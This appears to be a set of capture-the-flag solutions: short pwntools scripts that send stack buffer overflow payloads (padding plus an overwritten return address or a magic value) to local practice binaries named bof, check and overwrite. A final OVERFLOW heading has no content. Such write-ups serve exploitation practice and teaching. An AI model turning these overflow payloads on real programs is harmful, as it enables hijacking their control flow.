# ***BOF***

```
from pwn import *
io = process("./bof")
payload = b"A"*40
payload += p64(0x00000000004011b6)
io.sendline(payload)
io.interactive()
```
# ***CHECK***

```
from pwn import*
io = process("./check")
payload = b"A"*21
io.sendline(payload)
io.interactive()
```

# ***OVERWRITE***

```
from pwn import*
io= process("./overwrite")
payload = b"A"*160
payload += p64(0xcafebabe)
io.sendline(payload)
io.interactive()
```

# ***OVERFLOW***
